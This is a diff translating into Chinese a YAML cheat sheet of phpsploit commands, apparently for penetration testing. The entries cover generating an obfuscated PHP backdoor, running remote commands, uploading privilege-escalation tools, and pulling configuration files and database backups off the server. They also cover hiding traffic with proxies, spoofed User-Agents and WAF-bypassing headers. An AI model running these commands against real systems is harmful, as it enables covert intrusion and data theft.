@@ -3,89 +3,89 @@ tags: [web, post-exploitation, php, shell, security, pentest, stealth, backdoor]
 
 actions:
   # === INITIALIZATION & SETUP ===
-  - title: phpsploit - generate stealth backdoor
+  - title: phpsploit - 生成隐蔽后门
     desc: |
-      Generates the obfuscated PHP backdoor code that needs to be uploaded to the target server.
-      This script acts as the server-side component of the framework, enabling stealthy communication via HTTP headers.
-      You can specify the output path to save the generated code directly to a file for later deployment.
+      生成需要上传到目标服务器的混淆 PHP 后门代码。
+      该脚本作为框架的服务器端组件，通过 HTTP 头实现隐蔽通信。
+      你可以指定输出路径，将生成的代码直接保存到文件以便后续部署。
     command: "phpsploit -e \"backdoor --output {{output_path|backdoor.php}}\""
 
-  - title: phpsploit - display backdoor code
+  - title: phpsploit - 显示后门代码
     desc: |
-      Displays the PHP backdoor code directly in the terminal without saving it to a file.
-      This is useful if you want to manually copy-paste the code into an existing file on the target or a web-based file manager.
-      The generated code is highly obfuscated to bypass simple pattern-matching security solutions.
+      直接在终端中显示 PHP 后门代码而不保存到文件。
+      如果你想把代码手动复制粘贴到目标上已有的文件或基于 Web 的文件管理器中，这会很有用。
+      生成的代码经过高度混淆，可绕过简单的模式匹配安全方案。
     command: "phpsploit -e \"backdoor\""
 
   # === CONNECTION & SESSIONS ===
-  - title: phpsploit - connect to target
+  - title: phpsploit - 连接目标
     desc: |
-      Establishes an interactive connection to the pre-deployed PHP backdoor on the remote server.
-      This command initiates the handshake process and opens a command-line interface for further exploitation.
-      Make sure the URL provided is the exact path where the phpsploit backdoor is hosted.
+      与远程服务器上预先部署的 PHP 后门建立交互式连接。
+      该命令启动握手过程并打开命令行界面以进行进一步利用。
+      确保提供的 URL 是 phpsploit 后门所在的准确路径。
     command: "phpsploit --target {{url}}"
 
-  - title: phpsploit - load session
+  - title: phpsploit - 加载会话
     desc: |
-      Resumes a previously saved session from a local file.
-      This allows you to maintain persistence across different work sessions without losing configuration or target history.
-      Sessions contain information about the target URL, environment variables, and custom settings used during the last interaction.
+      从本地文件恢复之前保存的会话。
+      这使你能够在不同的工作会话之间保持持久化，而不会丢失配置或目标历史。
+      会话包含目标 URL、环境变量以及上次交互期间使用的自定义设置等信息。
     command: "phpsploit --load {{session_file}}"
 
-  - title: phpsploit - run commands from file
+  - title: phpsploit - 从文件运行命令
     desc: |
-      Executes a series of phpsploit commands stored in a local text file against the target.
-      This is ideal for automating repetitive tasks such as initial environment enumeration or automated cleanup.
-      The interactive mode is disabled by default when using this flag unless forced otherwise.
+      对目标执行存储在本地文本文件中的一系列 phpsploit 命令。
+      这非常适合自动化重复性任务，例如初始环境枚举或自动清理。
+      使用此标志时默认禁用交互模式，除非强制开启。
     command: "phpsploit --target {{url}} --source {{script_file}}"
 
   # === POST-EXPLOITATION ACTIONS ===
-  - title: phpsploit - system command execution
+  - title: phpsploit - 执行系统命令
     desc: |
-      Executes a native operating system command on the remote server through the PHP backdoor.
-      The results are returned through the obfuscated channel, minimizing the footprint in web server access logs.
-      Always check the current user's privileges before attempting sensitive commands to avoid unnecessary detection.
+      通过 PHP 后门在远程服务器上执行原生操作系统命令。
+      结果通过混淆通道返回，尽量减少在 Web 服务器访问日志中的痕迹。
+      在尝试敏感命令之前，务必先检查当前用户的权限，以避免不必要的检测。
     command: "phpsploit -e \"run {{system_command|id}}\" --target {{url}}"
 
-  - title: phpsploit - upload file
+  - title: phpsploit - 上传文件
     desc: |
-      Transfers a file from the local attacker machine to the remote compromised server.
-      This is critical for deploying privilege escalation scripts, static binaries, or other post-exploitation tools.
-      The transfer is handled via the stealthy HTTP tunnel, making it harder to detect compared to standard FTP or HTTP uploads.
+      将文件从本地攻击机传输到远程受控服务器。
+      这对于部署提权脚本、静态二进制文件或其他后渗透工具至关重要。
+      传输通过隐蔽的 HTTP 隧道完成，相比标准 FTP 或 HTTP 上传更难被检测。
     command: "phpsploit -e \"upload {{local_path}} {{remote_path}}\" --target {{url}}"
 
-  - title: phpsploit - download file
+  - title: phpsploit - 下载文件
     desc: |
-      Downloads a file from the target server to your local machine for analysis or exfiltration.
-      Use this to grab configuration files, database backups, or sensitive source code from the web root.
-      The tool ensures that the file content is retrieved securely through the established obfuscated medium.
+      将文件从目标服务器下载到本地机器以进行分析或数据外带。
+      可用它获取 Web 根目录下的配置文件、数据库备份或敏感源代码。
+      该工具确保通过已建立的混淆介质安全地获取文件内容。
     command: "phpsploit -e \"download {{remote_path}} {{local_path}}\" --target {{url}}"
 
-  - title: phpsploit - gather system information
+  - title: phpsploit - 收集系统信息
     desc: |
-      Collects detailed information about the target's operating system, PHP environment, and hardware.
-      This helps in identifying potential local privilege escalation vulnerabilities and understanding the environment's limitations.
-      It provides data such as the OS kernel version, PHP version, and lists of disabled PHP functions.
+      收集目标操作系统、PHP 环境和硬件的详细信息。
+      这有助于识别潜在的本地提权漏洞并了解环境的限制。
+      它提供的数据包括操作系统内核版本、PHP 版本以及被禁用的 PHP 函数列表。
     command: "phpsploit -e \"info\" --target {{url}}"
 
   # === STEALTH & CONFIGURATION ===
-  - title: phpsploit - connection via proxy
+  - title: phpsploit - 通过代理连接
     desc: |
-      Routes all phpsploit traffic through a specified proxy server (SOCKS or HTTP).
-      This is essential for anonymizing your activity or bypassing network restrictions that might block direct outgoing connections.
-      Ensure the proxy is active and reachable before attempting to connect to the target.
+      将 phpsploit 的所有流量经由指定的代理服务器（SOCKS 或 HTTP）路由。
+      这对于匿名化你的活动或绕过可能阻止直接出站连接的网络限制至关重要。
+      在尝试连接目标之前，确保代理处于活动状态且可访问。
     command: "phpsploit -e \"set proxy {{proxy_url|http://127.0.0.1:8080}}\" --target {{url}}"
 
-  - title: phpsploit - set custom user-agent
+  - title: phpsploit - 设置自定义 User-Agent
     desc: |
-      Changes the User-Agent string used by phpsploit to mimic a legitimate web browser.
-      Customizing this value helps the backdoor traffic blend in with normal user activity in the web server's logs.
-      Using a common browser string is a standard practice for staying stealthy during long-term engagements.
+      更改 phpsploit 使用的 User-Agent 字符串，以伪装成合法的 Web 浏览器。
+      自定义此值有助于后门流量在 Web 服务器日志中混入正常用户活动。
+      使用常见的浏览器字符串是长期行动中保持隐蔽的标准做法。
     command: "phpsploit -e \"set user-agent {{user_agent|Mozilla/5.0 (Windows NT 10.0; Win64; x64)}}\" --target {{url}}"
 
-  - title: phpsploit - set custom request header
+  - title: phpsploit - 设置自定义请求头
     desc: |
-      Adds or modifies custom HTTP headers for the communication between the client and the backdoor.
-      This can be used to bypass certain WAF rules or to match specific traffic patterns expected by the target environment.
-      Setting headers like 'X-Forwarded-For' might also be useful in specific network configurations.
+      为客户端与后门之间的通信添加或修改自定义 HTTP 头。
+      可用于绕过某些 WAF 规则，或匹配目标环境所期望的特定流量模式。
+      在某些网络配置中，设置诸如 X-Forwarded-For 之类的头也可能很有用。
     command: "phpsploit -e \"set {{header_name|X-Custom-Header}} {{header_value}}\" --target {{url}}"
